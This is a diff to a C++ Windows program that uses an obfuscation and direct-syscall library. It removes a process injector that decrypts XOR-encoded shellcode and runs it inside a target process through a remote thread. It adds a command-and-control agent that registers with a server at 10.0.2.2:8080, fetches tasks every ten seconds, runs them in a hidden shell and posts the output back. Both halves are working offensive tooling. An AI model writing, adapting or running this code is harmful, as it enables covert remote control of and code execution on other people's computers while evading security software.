@@ -1,128 +1,137 @@
+#include <chrono>
+#include <cpr/cpr.h>
+#include <iostream>
+#include <nlohmann/json.hpp>
 #include <ntdef.h>
 #include <nullgate/obfuscation.hpp>
 #include <nullgate/syscalls.hpp>
 #include <sample/ntapi.hpp>
 #include <stdexcept>
 #include <string>
+#include <thread>
 #include <windows.h>
 #include <winnt.h>
 
+using json = nlohmann::json;
+using namespace std::chrono_literals;
 namespace ng = nullgate;
 
+struct Task {
+  uint64_t taskId;
+  std::string command;
+};
+
+struct Result {
+  std::string Output;
+};
+
+std::string exec(const std::string &cmd) {
+  std::string strResult;
+  HANDLE hPipeRead, hPipeWrite;
+
+  SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
+  saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
+  saAttr.lpSecurityDescriptor = NULL;
+
+  // Create a pipe to get results from child's stdout.
+  if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
+    return strResult;
+
+  STARTUPINFOA si = {sizeof(STARTUPINFOW)};
+  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+  si.hStdOutput = hPipeWrite;
+  si.hStdError = hPipeWrite;
+  si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
+                            // Requires STARTF_USESHOWWINDOW in dwFlags.
+
+  PROCESS_INFORMATION pi = {0};
+
+  BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
+                                 CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+  if (!fSuccess) {
+    CloseHandle(hPipeWrite);
+    CloseHandle(hPipeRead);
+    return strResult;
+  }
+
+  bool bProcessEnded = false;
+  for (; !bProcessEnded;) {
+    // Give some timeslice (50 ms), so we won't waste 100% CPU.
+    bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
+
+    // Even if process exited - we continue reading, if
+    // there is some data available over pipe.
+    for (;;) {
+      char buf[1024];
+      DWORD dwRead = 0;
+      DWORD dwAvail = 0;
+
+      if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
+        break;
+
+      if (!dwAvail) // No data available, return
+        break;
+
+      auto readBytes =
+          (((sizeof(buf) - 1) < (dwAvail)) ? (sizeof(buf) - 1) : (dwAvail));
+      if (!::ReadFile(hPipeRead, buf, readBytes, &dwRead, NULL) || !dwRead)
+        // Error, the child process might ended
+        break;
+
+      buf[dwRead] = 0;
+      strResult += buf;
+    }
+  } // for
+
+  CloseHandle(hPipeWrite);
+  CloseHandle(hPipeRead);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+  return strResult;
+} // ExecCmd
+
+cpr::Url url(const std::string &endpoint) {
+  const std::string host = "http://10.0.2.2:8080";
+  return cpr::Url{host + endpoint};
+}
+
 int main(int argc, char *argv[]) {
-  const size_t shellcodeSize = 276; // Size of shellcode before encryption
-  const std::string encryptedShellcode =
-      "IAVFdwtpNAI+ek5rKnNxQHZWQX8Ha2QHbHseY3xxdEFzUEV3AGs1BG5/"
-      "H2txIXRCcFZFdws4ZARpch9rcSF0QnRWRXcLOGYEbXofa3klI0dyB0UuBz5iBztzH2t6ciJA"
-      "JwVCLAVrZlVoeBkwe3N1QSVXEnYDPmUHaHtIYixxJBRzVEV+"
-      "BmtlDmAoHmF7c3kSclRCLAdiYQc8ehMxcXN5SHZWQX8DamUOYH9IY353d0dyXkF+"
-      "V2pkBmAoH2t4e3VEfgRFfwFqZQ9oe09jLHB0RnJeFylQY2UHYCgYZ3F7dUh2VxV5Bz5iBztz"
-      "H2t6ciJAJwVFflBrMg9oLh9ieXIiQXVeFH8EbzcHbCkbYH0gc0R2XkV6AGM1B29/"
-      "T2t8e3VEfgRFfwFuZQ9oe09jf3V1QX4EQSwHYmUCYCgfY3ggdUl2VxV/"
-      "B2tpVGh+E2t9e3FBIlZFfgZiZQdtch42fHp0EXJXRHcHa2QPbHseMn17eUMjBUN/"
-      "B2tkBD4sTmN8e3VBc19ELgdiaVRpeE5qfHQnFiAAFykGPmUOOisbYnlzcUB2VkF/"
-      "A2phBmh6H2txJ3kUdldBfgNqYQZse0kyenJ5EnAASXhVPDUDOihOY3gncxF2B0V+UTswAGF/"
-      "STdwJycWIlNFdwtpMgJqchgweXV2E3YHSX9VODQGb38bZishdUd3VUZ9BTxnV2h6Hmp9cnlJ"
-      "IgcXKVdvZwVuex0wf3BzFXBTRncFb2EG";
+  uint64_t agentId{};
 
-  if (argc != 2)
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
-
-  ng::syscalls syscalls;
-  DWORD PID = std::stoi(argv[1]);
-  HANDLE processHandle = nullptr;
-  OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), nullptr};
-  CLIENT_ID clientId = {.UniqueProcess = reinterpret_cast<HANDLE>(PID),
-                        .UniqueThread = NULL};
-  auto status = syscalls.SCall<NtOpenProcess>(
-      ng::obfuscation::fnv1Const("NtOpenProcess"), &processHandle,
-      PROCESS_ALL_ACCESS, &objectAttrs, &clientId);
-  if (!NT_SUCCESS(status))
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
-                                   "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
-        std::to_string(status));
-
-  PVOID buf = NULL;
-  size_t regionSize = shellcodeSize;
-  status = syscalls.SCall<NtAllocateVirtualMemory>(
-      ng::obfuscation::fnv1Const("NtAllocateVirtualMemory"), processHandle,
-      &buf, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  if (!NT_SUCCESS(status)) {
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            processHandle);
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
-                                   "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
-        std::to_string(status));
+  if (argc == 2) {
+    agentId = std::stoi(argv[1]);
+  } else {
+    cpr::Response r = cpr::Post(url("/api/agents/register"));
+    json registerData = json::parse(r.text);
+    agentId = registerData["AgentId"];
   }
 
-  // A thread cannot be created if it's context hasn't been initialized(At least
-  // it didn't work for me)
-  char fakebuf[] = "pwned";
-  status = syscalls.SCall<NtWriteVirtualMemory>(
-      ng::obfuscation::fnv1Const("NtWriteVirtualMemory"), processHandle, buf,
-      reinterpret_cast<PVOID>(fakebuf), sizeof(fakebuf), nullptr);
-  if (!NT_SUCCESS(status)) {
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            processHandle);
-    throw std::runtime_error(ng::obfuscation::xorDecode(
-                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
-                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
-                             std::to_string(status));
+  const auto sleepTime = 10s;
+  while (true) {
+    cpr::Response r =
+        cpr::Get(url("/api/agents/" + std::to_string(agentId) + "/tasks"));
+    if (r.status_code != 200) {
+      std::cout << "Couldn't succesfully make http request\n" << r.text;
+      exit(1);
+    }
+    std::cout << r.text;
+    json taskData = json::parse(r.text);
+    for (const auto &jsonTask : taskData["Tasks"]) {
+      Task task{.taskId = jsonTask["TaskId"], .command = jsonTask["Task"]};
+      std::string res = exec(task.command);
+      json result;
+      result["Output"] = res;
+      cpr::Response r =
+          cpr::Post(url("/api/agents/" + std::to_string(agentId) + "/results/" +
+                        std::to_string(task.taskId)),
+                    cpr::Body(result.dump()),
+                    cpr::Header{{"Content-Type", "application/json"}});
+      if (r.status_code != 200) {
+        std::cout << "Couldn't save ouput of task\n" << r.text;
+        exit(1);
+      }
+    }
+
+    std::this_thread::sleep_for(sleepTime);
   }
-
-  HANDLE threadHandle = NULL;
-  auto startRoutine = reinterpret_cast<PUSER_THREAD_START_ROUTINE>(buf);
-  status = syscalls.SCall<NtCreateThreadEx>(
-      ng::obfuscation::fnv1Const("NtCreateThreadEx"), &threadHandle,
-      THREAD_ALL_ACCESS, &objectAttrs, processHandle, startRoutine, nullptr,
-      THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, nullptr);
-  if (!NT_SUCCESS(status)) {
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            processHandle);
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
-                                   "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
-        std::to_string(status));
-  }
-
-  auto decryptedShellcode =
-      ng::obfuscation::hex2bin(ng::obfuscation::xorDecode(encryptedShellcode));
-
-  status = syscalls.SCall<NtWriteVirtualMemory>(
-      ng::obfuscation::fnv1Const("NtWriteVirtualMemory"), processHandle, buf,
-      reinterpret_cast<PVOID>(decryptedShellcode.data()),
-      decryptedShellcode.size(), nullptr);
-  if (!NT_SUCCESS(status)) {
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            processHandle);
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            threadHandle);
-    throw std::runtime_error(ng::obfuscation::xorDecode(
-                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
-                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
-                             std::to_string(status));
-  }
-
-  status = syscalls.SCall<NtResumeThread>(
-      ng::obfuscation::fnv1Const("NtResumeThread"), threadHandle, nullptr);
-  if (!NT_SUCCESS(status)) {
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            processHandle);
-    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
-                            threadHandle);
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode(
-            "BQkEI1c0dkJ4OE4gPC4kUDIOAypSPn0WPitCPywnYQcvEhl1Ew==") +
-        std::to_string(status));
-  }
-
-  syscalls.SCall<NtWaitForSingleObject>(
-      ng::obfuscation::fnv1Const("NtWaitForSingleObject"), threadHandle, false,
-      nullptr);
-
-  syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), threadHandle);
-  syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), processHandle);
 }
